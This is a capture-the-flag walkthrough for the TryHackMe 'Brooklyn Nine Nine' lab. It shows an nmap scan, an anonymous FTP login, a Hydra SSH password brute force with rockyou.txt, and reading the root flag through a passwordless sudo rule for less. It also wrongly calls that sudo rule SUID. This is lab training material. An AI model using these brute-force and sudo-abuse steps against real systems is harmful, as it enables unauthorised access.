---
layout: default
title: Brooklyn Nine Nine
parent: TryHackMe
---
# CTF Writeup: [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)
![Category](https://img.shields.io/badge/Category-Network%20%2F%20PrivEsc-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tags](https://img.shields.io/badge/Tags-FTP%20%7C%20SSH%20%7C%20Brute--Force%20%7C%20Sudo%20Exploit-orange)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 31.12.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap
Let's use nmap to see what services are running on the machine:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>

21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ...
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
We can see that `FTP` has `Anonymous login` enabled.

Using this method we can see log into the machine to see what's inside:
```bash
❯ ftp <Machine-IP>
Connected to <Machine-IP> (<Machine-IP>).
220 (vsFTPd 3.0.3)
Name (<Machine-IP>): anonymous
331 Please specify the password.
Password:   #Leave Empty
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,80,176,131,98,149).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
```
the file `note_to_jake.txt` exists (Was also visible in nmap scan). We can download it using `get` command and then see what is inside:
```bash
❯ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
Ok, So now we know that user `jake` has weak password.

## 2. Initial Access
### Brute Force
Knowing the password is weak, we can use `Hydra` to Brute Force our way in:
```bash
❯ hydra -l jake -P kali-wordlists/rockyou.txt ssh://<Machine-IP>

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-31 13:41:24
[DATA] attacking ssh://<Machine-IP>:22/
[22][ssh] host: <Machine-IP>   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```
Using `rockyou.txt` which can be found on `/usr/share/wordlists/rockyou.txt` on `kali linux` we found a password which was indeed weak!

The password for user `jake` is `987654321`.
Let's login using `SSH`:
```bash
ssh jake@<Machine-IP>
jake@<Machine-IP>'s password: 987654321
```
The login is successful! Now let's find the user flag.

## 3. User Flag
There is no flag in user `jake`'s home directory, so we have to look around.

In `home` directory we got two other users `amy` and `holt` so let's see what we have here.

Eventually, there is the flag on `holt`'s directory and it is:
```bash
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11...23ee
```
Now that we got the first flag, let's move forward.

## 4. Priviledge Escalation
The first rule of the `PE` is to use `sudo -l` to have a list of commands or files we can use.
Let's see:
```bash
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
This means that we can use command `less` because it has the `SUID` we were looking for. 

**SUID:** In our situation, it means an application or a service which has both the current user and the root's permission. 

Let's use this command to read the root flag with `root` permission.

## 5. Root Flag
The command is as follows:
```bash
less /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9...1845

Enjoy!!
```
There we have the root flag!

Good Luck!

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
